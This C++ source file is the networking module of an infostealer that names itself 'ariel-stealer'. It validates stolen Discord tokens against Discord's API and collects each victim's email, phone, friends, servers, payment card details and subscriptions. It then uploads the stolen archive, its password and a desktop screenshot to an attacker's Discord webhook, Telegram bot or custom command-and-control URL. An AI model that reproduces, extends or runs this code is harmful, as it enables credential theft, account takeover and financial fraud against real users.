#include "net.hpp"

#include "util.hpp"

#include <windows.h>
#include <winhttp.h>

#include <algorithm>
#include <cstdio>
#include <cstdlib>
#include <string_view>
#include <utility>
#include <vector>

namespace ariel::net {

namespace {

struct target {
    std::wstring host;
    std::wstring path;
    bool secure = true;
    INTERNET_PORT port = INTERNET_DEFAULT_HTTPS_PORT;
};

struct http_guard {
    HINTERNET handle = nullptr;

    http_guard() = default;
    explicit http_guard(const HINTERNET value) : handle(value) {}
    http_guard(const http_guard&) = delete;
    http_guard& operator=(const http_guard&) = delete;
    ~http_guard() {
        if (handle) WinHttpCloseHandle(handle);
    }
};

struct text_part {
    std::string name;
    std::string value;
    bool json = false;
};

struct file_attachment {
    std::string field;
    std::string filename;
    std::string content_type;
    util::fs::path path;
};

bool parse_url(const std::string& url, target& out) {
    const std::wstring wide = util::from_utf8(url);
    const size_t scheme_end = wide.find(L"://");
    if (scheme_end == std::wstring::npos) return false;
    const std::wstring scheme = wide.substr(0, scheme_end);
    out.secure = scheme == L"https";
    if (!out.secure && scheme != L"http") return false;

    const size_t host_start = scheme_end + 3;
    const size_t slash = wide.find(L'/', host_start);
    out.host = wide.substr(host_start, slash == std::wstring::npos ? std::wstring::npos
                                                                  : slash - host_start);
    out.path = slash == std::wstring::npos ? L"/" : wide.substr(slash);
    out.port = out.secure ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
    return !out.host.empty();
}

std::string json_escape(const std::string_view value) {
    std::string out;
    for (const char c : value) {
        switch (c) {
            case '"': out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default: out.push_back(c); break;
        }
    }
    return out;
}

result post(const target& destination,
            const std::vector<text_part>& parts,
            const std::vector<file_attachment>& attachments,
            const std::vector<std::string>& extra_headers = {}) {
    const std::string boundary = "----ArielBoundary7MA4YWxkTrZu0gW";
    std::vector<uint8_t> body;
    const auto append = [&](const std::string_view value) {
        body.insert(body.end(), value.begin(), value.end());
    };

    for (const auto& part : parts) {
        append("--" + boundary + "\r\n");
        append("Content-Disposition: form-data; name=\"" + part.name + "\"\r\n");
        if (part.json) append("Content-Type: application/json\r\n");
        append("\r\n" + part.value + "\r\n");
    }
    for (const auto& attachment : attachments) {
        std::vector<uint8_t> payload;
        if (!util::read_file(attachment.path, payload))
            return {false, attachment.filename + " read failed"};
        append("--" + boundary + "\r\n");
        append("Content-Disposition: form-data; name=\"" + attachment.field +
               "\"; filename=\"" + attachment.filename + "\"\r\n");
        append("Content-Type: " + attachment.content_type + "\r\n\r\n");
        body.insert(body.end(), payload.begin(), payload.end());
        append("\r\n");
    }
    append("--" + boundary + "--\r\n");

    http_guard session(WinHttpOpen(L"ariel/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                   WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0));
    if (!session.handle) return {false, "WinHttpOpen failed"};

    http_guard connection(WinHttpConnect(session.handle, destination.host.c_str(),
                                         destination.port, 0));
    if (!connection.handle) return {false, "WinHttpConnect failed"};

    http_guard request(WinHttpOpenRequest(connection.handle, L"POST", destination.path.c_str(),
                                           nullptr, WINHTTP_NO_REFERER,
                                           WINHTTP_DEFAULT_ACCEPT_TYPES,
                                           destination.secure ? WINHTTP_FLAG_SECURE : 0));
    if (!request.handle) return {false, "WinHttpOpenRequest failed"};

    const std::wstring content_type = L"Content-Type: multipart/form-data; boundary=" +
                                      util::from_utf8(boundary);
    WinHttpAddRequestHeaders(request.handle, content_type.c_str(),
                             static_cast<DWORD>(content_type.size()),
                             WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    for (const auto& header : extra_headers) {
        const std::wstring wide = util::from_utf8(header);
        if (!wide.empty())
            WinHttpAddRequestHeaders(request.handle, wide.c_str(),
                                     static_cast<DWORD>(wide.size()),
                                     WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    }

    const DWORD body_size = static_cast<DWORD>(body.size());
    if (!WinHttpSendRequest(request.handle, WINHTTP_NO_ADDITIONAL_HEADERS, 0, body.data(),
                            body_size, body_size, 0))
        return {false, "send failed: " + std::to_string(GetLastError())};
    if (!WinHttpReceiveResponse(request.handle, nullptr))
        return {false, "response failed: " + std::to_string(GetLastError())};

    DWORD status = 0;
    DWORD status_size = sizeof(status);
    WinHttpQueryHeaders(request.handle, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_size,
                        WINHTTP_NO_HEADER_INDEX);

    std::string response;
    DWORD available = 0;
    while (WinHttpQueryDataAvailable(request.handle, &available) && available > 0) {
        std::vector<char> buffer(available);
        DWORD read = 0;
        if (!WinHttpReadData(request.handle, buffer.data(), available, &read)) break;
        response.append(buffer.data(), read);
    }

    const bool accepted = status >= 200 && status < 300;
    if (response.size() > 1500) response.resize(1500);
    return {accepted, "HTTP " + std::to_string(status) + (response.empty() ? "" : " " + response)};
}

struct http_response {
    bool ok = false;
    DWORD status = 0;
    std::string body;
};

http_response api_get(const std::string& path, const std::string& token) {
    http_response failed;
    target destination;
    if (!parse_url("https://discord.com" + path, destination)) return failed;

    http_guard session(WinHttpOpen(L"ariel/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                   WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0));
    if (!session.handle) return failed;

    http_guard connection(WinHttpConnect(session.handle, destination.host.c_str(),
                                         destination.port, 0));
    if (!connection.handle) return failed;

    http_guard request(WinHttpOpenRequest(connection.handle, L"GET", destination.path.c_str(),
                                          nullptr, WINHTTP_NO_REFERER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE));
    if (!request.handle) return failed;

    const DWORD timeouts[4] = {5000, 5000, 10000, 15000};
    WinHttpSetTimeouts(request.handle, timeouts[0], timeouts[1], timeouts[2], timeouts[3]);

    const std::wstring authorization = L"Authorization: " + util::from_utf8(token);
    WinHttpAddRequestHeaders(request.handle, authorization.c_str(),
                             static_cast<DWORD>(authorization.size()),
                             WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    const std::wstring accept = L"Accept: application/json";
    WinHttpAddRequestHeaders(request.handle, accept.c_str(),
                             static_cast<DWORD>(accept.size()),
                             WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    const std::wstring user_agent = L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
    WinHttpAddRequestHeaders(request.handle, user_agent.c_str(),
                             static_cast<DWORD>(user_agent.size()),
                             WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    if (!WinHttpSendRequest(request.handle, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) return failed;
    if (!WinHttpReceiveResponse(request.handle, nullptr)) return failed;

    DWORD status = 0;
    DWORD status_size = sizeof(status);
    WinHttpQueryHeaders(request.handle, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_size,
                        WINHTTP_NO_HEADER_INDEX);
    failed.status = status;

    constexpr size_t max_body = 256u * 1024u;
    DWORD available = 0;
    while (WinHttpQueryDataAvailable(request.handle, &available) && available > 0) {
        if (failed.body.size() >= max_body) break;
        const DWORD wanted = static_cast<DWORD>(
            std::min<size_t>(available, max_body - failed.body.size()));
        std::vector<char> buffer(wanted);
        DWORD read = 0;
        if (!WinHttpReadData(request.handle, buffer.data(), wanted, &read)) break;
        failed.body.append(buffer.data(), read);
    }
    failed.ok = status >= 200 && status < 300;
    return failed;
}

std::string http_status(const http_response& response) {
    if (!response.status) return "network error";
    return "HTTP " + std::to_string(response.status);
}

long long json_integer(std::string_view json, std::string_view key) {
    const auto raw = util::json_raw(json, key);
    if (!raw) return 0;
    const std::string value = util::trim(*raw);
    return std::strtoll(value.c_str(), nullptr, 10);
}

bool json_boolean(std::string_view json, std::string_view key) {
    const auto raw = util::json_raw(json, key);
    return raw && util::trim(*raw) == "true";
}

std::string json_value(std::string_view json, std::string_view key) {
    const auto value = util::json_string(json, key);
    return value ? *value : std::string{};
}

std::string mask_token(const std::string& token) {
    if (token.size() <= 28) return token.empty() ? "-" : token.substr(0, 8) + "...";
    return token.substr(0, 24) + "...";
}

std::string created_from_snowflake(const std::string& id) {
    if (id.empty()) return "-";
    const unsigned long long value = std::strtoull(id.c_str(), nullptr, 10);
    if (!value) return "-";
    const unsigned long long ticks = ((value >> 22) + 1420070400000ULL) * 10000ULL;
    FILETIME file_time{static_cast<DWORD>(ticks & 0xFFFFFFFFu),
                       static_cast<DWORD>(ticks >> 32)};
    SYSTEMTIME system_time{};
    if (!FileTimeToSystemTime(&file_time, &system_time)) return "-";
    char buffer[32]{};
    std::snprintf(buffer, sizeof(buffer), "%04u-%02u-%02u", system_time.wYear,
                  system_time.wMonth, system_time.wDay);
    return buffer;
}

std::string nitro_text(const int premium_type) {
    switch (premium_type) {
        case 1: return "Nitro Classic";
        case 2: return "Nitro";
        case 3: return "Nitro Basic";
        default: return "none";
    }
}

std::string flags_text(const unsigned long long flags) {
    static constexpr std::pair<unsigned long long, const char*> names[] = {
        {1ull << 0, "Staff"},
        {1ull << 1, "Partner"},
        {1ull << 2, "HypeSquad"},
        {1ull << 3, "Bug Hunter 1"},
        {1ull << 6, "House of Bravery"},
        {1ull << 7, "Early Supporter"},
        {1ull << 9, "House of Brilliance"},
        {1ull << 10, "House of Balance"},
        {1ull << 14, "Bug Hunter 2"},
        {1ull << 16, "Verified Bot"},
        {1ull << 17, "Early Bot Developer"},
        {1ull << 18, "Certified Moderator"},
        {1ull << 19, "Bot HTTP Interactions"},
        {1ull << 22, "Active Developer"},
    };
    std::string out;
    for (const auto& entry : names) {
        if (!(flags & entry.first)) continue;
        if (!out.empty()) out += ", ";
        out += entry.second;
    }
    return out.empty() ? "-" : out;
}

std::string joined(const std::vector<std::string>& values) {
    std::string out;
    for (const auto& value : values) {
        if (!out.empty()) out += ", ";
        if (out.size() > 180) break;
        out += value;
    }
    return out.empty() ? "-" : out;
}

void parse_guilds(const http_response& response, discord_account& account) {
    if (!response.ok) {
        account.error += " guilds " + http_status(response);
        return;
    }
    const auto guilds = util::json_objects(response.body);
    account.guild_count = guilds.size();
    std::vector<std::string> names;
    for (const auto guild : guilds) {
        const std::string name = json_value(guild, "name");
        if (name.empty()) continue;
        if (names.size() < 8) names.push_back(name);
    }
    account.guilds = joined(names);
}

void parse_friends(const http_response& response, discord_account& account) {
    if (!response.ok) {
        account.error += " relationships " + http_status(response);
        return;
    }
    for (const auto relation : util::json_objects(response.body)) {
        if (json_integer(relation, "type") != 1) continue;
        ++account.friend_count;
        if (account.friends.size() < 200) {
            const std::string name = json_value(relation, "username");
            if (!name.empty()) account.friends += (account.friends.empty() ? "" : ", ") + name;
        }
    }
    if (account.friends.empty()) account.friends = "-";
}

void parse_payment(const http_response& response, discord_account& account) {
    if (response.ok) {
        for (const auto source : util::json_objects(response.body)) {
            const std::string brand = json_value(source, "brand");
            const std::string last4 = json_value(source, "last4");
            if (brand.empty() && last4.empty()) continue;
            std::string line = (brand.empty() ? std::string("card") : brand) + " ****" +
                               (last4.empty() ? std::string("????") : last4);
            const long long month = json_integer(source, "expires_month");
            const long long year = json_integer(source, "expires_year");
            if (month > 0 && year > 0) {
                char expiry[24]{};
                std::snprintf(expiry, sizeof(expiry), " exp %02lld/%02lld", month, year % 100);
                line += expiry;
            }
            if (!account.payment.empty()) account.payment += "\n";
            account.payment += line;
        }
    } else {
        account.error += " payment " + http_status(response);
    }
    if (account.payment.empty()) account.payment = "-";
}

void parse_subscriptions(const http_response& response, discord_account& account) {
    if (!response.ok) {
        account.error += " subscriptions " + http_status(response);
        return;
    }
    std::string_view objects = response.body;
    const auto wrapped = util::json_raw(response.body, "subscriptions");
    if (wrapped) objects = *wrapped;
    for (const auto subscription : util::json_objects(objects)) {
        const std::string name = json_value(subscription, "name");
        if (name.empty()) continue;
        if (!account.subscriptions.empty()) account.subscriptions += "\n";
        account.subscriptions += name;
        const std::string status = json_value(subscription, "status");
        if (!status.empty()) account.subscriptions += " [" + status + "]";
    }
    if (account.subscriptions.empty()) account.subscriptions = "-";
}

std::string text_value(const std::string& value) {
    return value.empty() ? "-" : value;
}

}  // namespace

std::vector<discord_account> inspect_discord_tokens(
    const std::vector<discord_token_input>& tokens) {
    std::vector<discord_account> out;
    out.reserve(tokens.size());
    for (const auto& input : tokens) {
        discord_account account;
        account.source = input.source;
        account.token = input.token;
        if (input.token.empty()) {
            account.error = "empty token";
            out.push_back(account);
            continue;
        }

        const auto me = api_get("/api/v10/users/@me", input.token);
        if (!me.ok) {
            account.error = http_status(me);
            out.push_back(account);
            continue;
        }

        account.valid = true;
        account.id = json_value(me.body, "id");
        account.username = json_value(me.body, "username");
        account.discriminator = json_value(me.body, "discriminator");
        account.global_name = json_value(me.body, "global_name");
        account.email = json_value(me.body, "email");
        account.phone = json_value(me.body, "phone");
        account.locale = json_value(me.body, "locale");
        account.created = created_from_snowflake(account.id);
        const std::string avatar = json_value(me.body, "avatar");
        const std::string banner = json_value(me.body, "banner");
        if (!account.id.empty() && !avatar.empty())
            account.avatar_url = "https://cdn.discordapp.com/avatars/" + account.id + "/" + avatar + ".png";
        if (!account.id.empty() && !banner.empty())
            account.banner_url = "https://cdn.discordapp.com/banners/" + account.id + "/" + banner + ".png";
        account.accent_color = json_integer(me.body, "accent_color");
        account.verified = json_boolean(me.body, "verified");
        account.mfa_enabled = json_boolean(me.body, "mfa_enabled");
        account.premium_type = static_cast<int>(json_integer(me.body, "premium_type"));
        account.flags = static_cast<unsigned long long>(json_integer(me.body, "flags"));
        account.public_flags = static_cast<unsigned long long>(json_integer(me.body, "public_flags"));
        account.badges = flags_text(account.flags ? account.flags : account.public_flags);

        parse_guilds(api_get("/api/v10/users/@me/guilds", input.token), account);
        parse_friends(api_get("/api/v10/users/@me/relationships", input.token), account);
        parse_payment(api_get("/api/v10/users/@me/billing/payment-sources", input.token), account);
        parse_subscriptions(api_get("/api/v10/users/@me/billing/subscriptions", input.token), account);

        out.push_back(account);
    }
    return out;
}

std::string describe_account(const discord_account& account, const bool full_token) {
    std::string out;
    const auto line = [&](const char* name, const std::string& value) {
        out += name;
        out += ": ";
        out += text_value(value);
        out += "\n";
    };

    line("source", account.source);
    line("token", full_token ? account.token : mask_token(account.token));
    if (!account.valid) {
        line("status", "invalid (" + text_value(account.error) + ")");
        return out;
    }

    std::string user = account.username;
    if (!account.discriminator.empty() && account.discriminator != "0")
        user += "#" + account.discriminator;
    if (!account.global_name.empty() && account.global_name != user)
        user += " (" + account.global_name + ")";
    line("user", user);
    line("id", account.id);
    line("nitro", nitro_text(account.premium_type));
    line("email", account.email);
    line("phone", account.phone);
    line("locale", account.locale);
    line("created", account.created);
    if (account.accent_color > 0) {
        char color[16]{};
        std::snprintf(color, sizeof(color), "#%06X",
                      static_cast<unsigned>(account.accent_color) & 0xFFFFFFu);
        line("accent color", color);
    }
    line("avatar", account.avatar_url);
    line("banner", account.banner_url);
    line("verified", account.verified ? "yes" : "no");
    line("mfa", account.mfa_enabled ? "yes" : "no");
    line("badges", account.badges);
    line("flags", std::to_string(account.flags ? account.flags : account.public_flags));
    line("guilds", std::to_string(account.guild_count) + " - " + account.guilds);
    line("friends", std::to_string(account.friend_count) + " - " + account.friends);
    line("payment", account.payment);
    line("subscriptions", account.subscriptions);
    if (!account.error.empty()) line("notes", util::trim(account.error));
    return out;
}

result send_discord(const std::string& webhook_url,
                    const util::fs::path& file,
                    const std::string& password,
                    const util::fs::path& screenshot,
                    const discord_report& report) {
    target destination;
    if (!parse_url(webhook_url, destination)) return {false, "invalid webhook url"};

    const std::string filename = util::narrow_path(file.filename());
    const std::string github = "https://github.com/ihateapples/ariel-stealer";
    const std::string logo = report.thumbnail_url.empty()
                                 ? "https://raw.githubusercontent.com/ihateapples/ariel-stealer/refs/heads/main/icon.png"
                                 : report.thumbnail_url;

    std::string description = "**New package captured**\nArchive: `" + filename + "`";
    if (!password.empty()) description += "\nPassword: `" + password + "`";

    const auto field_json = [](std::string name, std::string value, const bool inline_field) {
        if (name.size() > 250) name.resize(250);
        if (value.empty()) value = "-";
        if (value.size() > 1000) value.resize(1000);
        return std::string("{\"name\":\"") + json_escape(name) + "\",\"value\":\"" +
               json_escape(value) + "\",\"inline\":" + (inline_field ? "true" : "false") + "}";
    };
    const auto code_block = [](std::string value) {
        std::replace(value.begin(), value.end(), '`', '\'');
        if (value.size() > 940) value.resize(940);
        return std::string("```text\n") + text_value(value) + "\n```";
    };
    const auto inline_code = [](std::string value) {
        std::replace(value.begin(), value.end(), '`', '\'');
        if (value.size() > 900) value.resize(900);
        return std::string("`") + text_value(value) + "`";
    };
    const auto make_embed = [&](const std::string& title,
                                const std::string& embed_description,
                                const std::string& fields,
                                const std::string& thumbnail_url,
                                const std::string& extra,
                                const long long color = 5793242) {
        return std::string("{\"title\":\"") + json_escape(title) + "\","
               "\"url\":\"" + github + "\","
               "\"description\":\"" + json_escape(embed_description) + "\","
               "\"color\":" + std::to_string(color) + ","
               "\"fields\":[" + fields + "],"
               "\"thumbnail\":{\"url\":\"" + json_escape(thumbnail_url) + "\"}" + extra + ","
               "\"footer\":{\"text\":\"ihateapples/ariel-stealer\",\"icon_url\":\"" +
               json_escape(logo) + "\"}}";
    };
    const auto join_fields = [](const std::vector<std::string>& values) {
        std::string out;
        for (const auto& value : values) {
            if (!out.empty()) out += ",";
            out += value;
        }
        return out;
    };

    size_t valid_accounts = 0;
    size_t invalid_accounts = 0;
    for (const auto& account : report.accounts) {
        if (account.valid)
            ++valid_accounts;
        else
            ++invalid_accounts;
    }
    if (report.tokens && !valid_accounts && !invalid_accounts)
        invalid_accounts = report.tokens;

    std::vector<std::string> base_fields;
    base_fields.push_back(field_json("User", report.user, true));
    base_fields.push_back(field_json("Host", report.host, true));
    base_fields.push_back(field_json("Domain", report.domain, true));
    base_fields.push_back(field_json("OS", report.os, false));
    base_fields.push_back(field_json("CPU", report.cpu, false));
    base_fields.push_back(field_json("RAM", report.ram, true));
    base_fields.push_back(field_json("Display", report.display, true));
    base_fields.push_back(field_json("Local time", report.local_time, true));
    base_fields.push_back(field_json("Records", std::to_string(report.credentials), true));
    base_fields.push_back(field_json("Discord tokens", std::to_string(report.tokens), true));
    base_fields.push_back(field_json("Valid accounts", std::to_string(valid_accounts), true));
    base_fields.push_back(field_json("Archive", filename, true));
    base_fields.push_back(field_json("Password", password, true));

    std::vector<file_attachment> attachments = {
        {"files[0]", filename, "application/zip", file},
    };
    std::string image;
    if (!screenshot.empty()) {
        attachments.push_back({"files[1]", "screenshot.png", "image/png", screenshot});
        image = ",\"image\":{\"url\":\"attachment://screenshot.png\"}";
    }

    std::vector<std::string> embeds;
    embeds.push_back(make_embed("Ariel", description, join_fields(base_fields), logo, image));

    size_t account_number = 1;
    for (const auto& account : report.accounts) {
        if (!account.valid) continue;
        const std::string title = "Discord account " + std::to_string(account_number++);
        const std::string thumbnail_url = account.avatar_url.empty() ? logo : account.avatar_url;

        std::string user = account.username;
        if (!account.discriminator.empty() && account.discriminator != "0")
            user += "#" + account.discriminator;
        if (!account.global_name.empty() && account.global_name != user)
            user += " (" + account.global_name + ")";
        char accent[16]{};
        std::snprintf(accent, sizeof(accent), "#%06X",
                      static_cast<unsigned>(account.accent_color) & 0xFFFFFFu);

        std::vector<std::string> fields;
        fields.push_back(field_json("Token", code_block(account.token), false));
        fields.push_back(field_json("Email", inline_code(account.email), true));
        fields.push_back(field_json("Phone", inline_code(account.phone), true));
        fields.push_back(field_json("User", inline_code(user), true));
        fields.push_back(field_json("ID", inline_code(account.id), true));
        fields.push_back(field_json("Nitro", inline_code(nitro_text(account.premium_type)), true));
        fields.push_back(field_json("Locale", inline_code(account.locale), true));
        fields.push_back(field_json("Created", inline_code(account.created), true));
        fields.push_back(field_json("Verified", inline_code(account.verified ? "yes" : "no"), true));
        fields.push_back(field_json("MFA", inline_code(account.mfa_enabled ? "yes" : "no"), true));
        if (account.accent_color > 0)
            fields.push_back(field_json("Accent color", inline_code(accent), true));
        fields.push_back(field_json("Badges", inline_code(account.badges), true));
        fields.push_back(field_json("Flags", inline_code(
            std::to_string(account.flags ? account.flags : account.public_flags)), true));
        fields.push_back(field_json("Avatar", code_block(account.avatar_url), false));
        fields.push_back(field_json("Banner", code_block(account.banner_url), false));
        fields.push_back(field_json("Guilds (" + std::to_string(account.guild_count) + ")",
                                    code_block(account.guilds), false));
        fields.push_back(field_json("Friends (" + std::to_string(account.friend_count) + ")",
                                    code_block(account.friends), false));
        fields.push_back(field_json("Payment", code_block(account.payment), false));
        fields.push_back(field_json("Subscriptions", code_block(account.subscriptions), false));
        fields.push_back(field_json("Source", code_block(account.source), false));
        if (!account.error.empty())
            fields.push_back(field_json("Notes", code_block(util::trim(account.error)), false));

        const size_t chunk_size = 10;
        for (size_t i = 0; i < fields.size(); i += chunk_size) {
            const size_t end = std::min(i + chunk_size, fields.size());
            const std::vector<std::string> chunk(fields.begin() + i, fields.begin() + end);
            const std::string part = end == fields.size()
                                         ? ""
                                         : " (" + std::to_string(i / chunk_size + 1) + ")";
            const std::string detail = i == 0 ? "Checked Discord account"
                                              : "Discord account details continued";
            embeds.push_back(make_embed("Ariel - " + title + part, detail,
                                        join_fields(chunk), thumbnail_url, "", 0xb143e3));
        }
    }

    if (invalid_accounts) {
        std::string invalid_details;
        for (const auto& account : report.accounts) {
            if (account.valid) continue;
            if (invalid_details.size() > 900) break;
            invalid_details += text_value(account.source) + " " + text_value(account.error) + "\n";
        }
        if (invalid_details.empty())
            invalid_details = std::to_string(invalid_accounts) + " tokens could not be checked";
        embeds.push_back(make_embed("Ariel - Invalid tokens", "Token check results",
                                    field_json("Invalid tokens", code_block(invalid_details), false),
                                    logo, ""));
    }

    std::string combined_detail;
    for (size_t i = 0; i < embeds.size(); ++i) {
        const bool first = i == 0;
        const bool ping = first && report.ping_everyone;
        const std::string content = ping ? "@everyone" : "";
        const std::string allowed_mentions = ping ? ",\"allowed_mentions\":{\"parse\":[\"everyone\"]}" : "";
        const std::string payload = "{\"content\":\"" + json_escape(content) +
                                    "\",\"embeds\":[" + embeds[i] + "]" + allowed_mentions + "}";
        const auto result = post(destination, {{"payload_json", payload, true}},
                                 first ? attachments : std::vector<file_attachment>{}, {});
        if (!result.ok) return result;
        if (!combined_detail.empty()) combined_detail += " | ";
        std::string detail = result.detail;
        if (detail.size() > 160) detail.resize(160);
        combined_detail += "message " + std::to_string(i + 1) + " " + detail;
    }
    return {true, combined_detail};
}

result send_telegram(const std::string& token,
                     const std::string& chat_id,
                     const util::fs::path& file,
                     const std::string& password) {
    target destination;
    if (!parse_url("https://api.telegram.org/bot" + token + "/sendDocument", destination))
        return {false, "invalid bot token"};

    std::string caption = "ariel package - " + util::narrow_path(file.filename());
    if (!password.empty()) caption += " | password: " + password;
    if (caption.size() > 1000) caption.resize(1000);

    return post(destination, {{"chat_id", chat_id, false}, {"caption", caption, false}},
                {{"document", util::narrow_path(file.filename()), "application/zip", file}}, {});
}

namespace {

std::vector<std::string> split_lines(const std::string& value) {
    std::vector<std::string> lines;
    size_t start = 0;
    while (start <= value.size()) {
        const size_t end = value.find_first_of("\r\n", start);
        const std::string line = util::trim(value.substr(
            start, end == std::string::npos ? std::string::npos : end - start));
        if (!line.empty()) lines.push_back(line);
        if (end == std::string::npos) break;
        start = end + 1;
    }
    return lines;
}

void replace_placeholder(std::string& value, const std::string& placeholder,
                         const std::string& replacement) {
    size_t position = 0;
    while ((position = value.find(placeholder, position)) != std::string::npos) {
        value.replace(position, placeholder.size(), replacement);
        position += replacement.size();
    }
}

}  // namespace

result send_custom(const std::string& url,
                   const std::string& file_field,
                   const std::string& headers,
                   const std::string& fields,
                   const util::fs::path& file,
                   const std::string& password) {
    target destination;
    if (!parse_url(url, destination)) return {false, "invalid c2 url"};

    std::vector<text_part> parts;
    bool has_password = false;
    for (const auto& line : split_lines(fields)) {
        const size_t equals = line.find('=');
        if (equals == std::string::npos) continue;
        std::string name = util::trim(line.substr(0, equals));
        std::string value = util::trim(line.substr(equals + 1));
        replace_placeholder(value, "{password}", password);
        replace_placeholder(value, "{filename}", util::narrow_path(file.filename()));
        if (name == "password") has_password = true;
        if (!name.empty()) parts.push_back({name, value, false});
    }
    if (!password.empty() && !has_password)
        parts.push_back({"password", password, false});

    const std::string field = file_field.empty() ? "file" : file_field;
    return post(destination, parts,
                {{field, util::narrow_path(file.filename()), "application/zip", file}},
                split_lines(headers));
}

}  // namespace ariel::net
